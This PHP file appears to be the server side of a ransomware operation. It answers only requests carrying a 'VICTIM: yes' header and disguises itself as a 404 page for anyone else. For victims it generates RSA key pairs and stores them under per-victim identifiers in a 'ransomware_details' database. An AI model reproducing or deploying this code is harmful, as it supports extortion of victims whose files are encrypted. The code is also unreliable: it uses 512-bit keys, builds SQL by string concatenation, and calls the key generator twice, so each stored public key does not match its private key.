<?php

function Connect(){
	//Configuration of database
	$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
	if(!$dbconn)
	{
		echo "An error Ocurred!\n";
		exit;
	}
	return $dbconn;
}

function keyPairGeneration(){
	//Setting up Key Pair for encryption
	$config = array(
		"digest_alg" => "sha512",
		"private_key_bits" => 512,
		"private_key_type" => OPENSSL_KEYTYPE_RSA,
	);
	$res = openssl_pkey_new($config);
	openssl_pkey_export($res,$privKey);
	$pubKey = openssl_pkey_get_details($res);
	$pubKey = $pubKey["key"];
	//echo $pubKey;
	//echo $privKey;
	$keys = new StdClass();
	$keys->privKey = $privKey;
	$keys->pubKey = $pubKey;
	return $keys;
}

function getRequestHeaders(){
	$headers = array();
	foreach($_SERVER as $key => $value){
		$headers[$key] = $value;
	}
	return $headers;
}

function checkValidity(){
	$headers = getRequestHeaders();
	foreach($headers as $header => $value){
		if($header == "HTTP_VICTIM" && $value=="yes"){
			return 1;
			//echo keyPairGeneration()->pubKey;	
		}
	}
	return 0;
}

function abort(){
	echo "Not reachable!";
}

function hide(){
	//404 page
	echo "<html>
		<head>
			<title>404 Error - Page Not Found</title>
		</head>
		<body>404 Error - Page Not Found!</body>
	</html>";
}

if(checkValidity()){
	$dbconn = Connect();
	$result = pg_query($dbconn, "SELECT identifier FROM ransomware_details ORDER BY identifier DESC LIMiT 1;");
	//echo "Working!";
	if(!$result){
		abort();
		exit;
	}
	$id=pg_fetch_row($result)[0];
	$id = $id+1;
	$priv =  keyPairGeneration()->privKey;
	$pub =  keyPairGeneration()->pubKey;
	//echo $priv;
	//echo $pub;
	$query = "INSERT INTO ransomware_details (identifier,public_key,private_key) VALUES "."( '$id','$pub','$priv')";
	$result = pg_query($dbconn,$query);
	//echo $result;
	if(!$result){
		abort();
		exit;
	}
}
else{
	hide();
}
?>